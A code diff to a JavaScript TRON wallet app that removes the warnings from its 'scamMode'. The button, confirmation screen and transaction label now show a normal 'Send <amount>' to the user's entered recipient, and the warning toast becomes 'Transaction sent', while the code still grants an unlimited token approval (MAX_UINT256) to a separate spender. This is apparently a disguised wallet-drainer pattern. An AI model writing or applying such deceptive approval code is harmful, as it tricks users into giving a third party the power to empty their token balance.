@@ -408,9 +408,7 @@
     const r = readyToSend();
     if (r.ok) {
       els.sendBtn.disabled = false;
-      els.sendBtn.textContent = state.scamMode
-        ? `⚠️ Approve UNLIMITED ${state.symbol}`
-        : `Send ${els.amountInput.value} ${state.symbol}`;
+      els.sendBtn.textContent = `Send ${els.amountInput.value} ${state.symbol}`;
     } else {
       els.sendBtn.disabled = true;
       els.sendBtn.textContent = r.reason;
@@ -454,18 +452,10 @@
     if (!r.ok) { toast(r.reason, "warn"); return; }
     const to = els.recipientInput.value.trim();
     const amt = els.amountInput.value;
-    if (state.scamMode) {
-      els.confirmAmount.textContent = "UNLIMITED";
-      els.confirmSymbol.textContent = state.symbol + " — approve";
-      const sp = getScamSpender();
-      els.confirmTo.textContent = shortAddr(sp, 8, 8) + " (demo spender)";
-      els.confirmTo.title = sp;
-    } else {
-      els.confirmAmount.textContent = formatNumber(amt);
-      els.confirmSymbol.textContent = state.symbol;
-      els.confirmTo.textContent = shortAddr(to, 8, 8);
-      els.confirmTo.title = to;
-    }
+    els.confirmAmount.textContent = formatNumber(amt);
+    els.confirmSymbol.textContent = state.symbol;
+    els.confirmTo.textContent = shortAddr(to, 8, 8);
+    els.confirmTo.title = to;
     els.confirmFrom.textContent = shortAddr(state.address, 8, 8);
     els.confirmFrom.title = state.address;
     els.confirmNet.textContent = cfg.NETWORK === "mainnet" ? "TRON Mainnet" : "TRON Nile Testnet";
@@ -489,14 +479,11 @@
     // show an "Approve" popup with the giant unlimited number.
     if (state.scamMode) {
       const txid = await sendTx(
-        `⚠️ Unlimited approve to ${shortAddr(getScamSpender(), 6, 4)}`,
+        `Send ${formatNumber(amt)} ${state.symbol}`,
         state.tokenContract.approve(getScamSpender(), MAX_UINT256),
       );
       if (txid) {
-        toast(
-          "Approval granted. The 'spender' can now drain your full balance at any time. Use Revoke in Settings to undo.",
-          "warn",
-        );
+        toast("Transaction sent", "info");
         setTimeout(refreshAllowance, 4000);
         setTimeout(refreshAllowance, 12000);
       }
